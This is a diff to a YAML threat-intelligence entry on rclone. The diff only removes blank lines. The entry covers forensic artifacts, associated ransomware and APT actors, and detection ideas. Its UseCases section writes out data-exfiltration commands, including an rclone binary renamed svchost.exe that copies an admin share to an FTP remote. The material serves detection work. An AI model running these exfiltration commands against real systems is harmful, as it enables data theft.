@@ -21,7 +21,6 @@ Capabilities:
   - encrypted-transfer
   - proxy-support
   - scriptable-execution
-
 Forensics:
   FileNamePatterns:
     - rclone.exe
@@ -60,23 +59,19 @@ Forensics:
 ThreatActors:
   - ransomware
   - apt
-
 UseCases:
   - Title: Standard cloud upload
     Description: Upload a directory to remote cloud storage using default config.
     Command: rclone copy /data remote:backup
-
   - Title: Masqueraded exfiltration with custom config
     Description: Masqueraded rclone binary used with renamed config to perform exfiltration.
     Command: |
       svchost.exe --config svchost.conf --progress --no-check-certificate copy "\\Server\C$\Share" ftp1:/domain/share
-
   - Title: Ransomware-style exfiltration with filtering
     Description: Copy data while excluding file types and using multiple threads to speed up the upload.
     Command: |
       rclone.exe copy --max-age 5y "\\BACKUP\E:\" remote:Groups --exclude "*.{psd,rar,zip}"
       --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P
-
   - Title: FTP exfiltration with minimal footprint
     Description: Send data to an FTP server while skipping known extensions and logging minimal output.
     Command: |
@@ -85,16 +80,12 @@ UseCases:
 Detection:
   - Type: Suspicious Parent Process
     Description: Detect execution of rclone.exe with uncommon or suspicious parent processes (e.g., powershell.exe, wscript.exe, office applications, OneNote, WMIC).
-
   - Type: Masquerading Detection
     Description: Alert when rclone is renamed to common system binaries (e.g., svchost.exe) but shows rclone-related flags in command-line (e.g., --config, copy, sync).
-
   - Type: WebDAV/FTP Exfiltration
     Description: Monitor for rclone activity over non-standard protocols (e.g., FTP, WebDAV). Rclone used in Egregor and others to exfiltrate via these channels.
-
   - Type: Large Data Transfer
     Description: Correlate rclone execution with high bytes_out in a short timeframe, indicating bulk exfiltration after archive creation.
-
   - Type: Scheduled Task or Registry Persistence
     Description: Check for creation of scheduled tasks or registry Run keys that execute rclone (e.g., via svchost.exe masquerade).
 References:
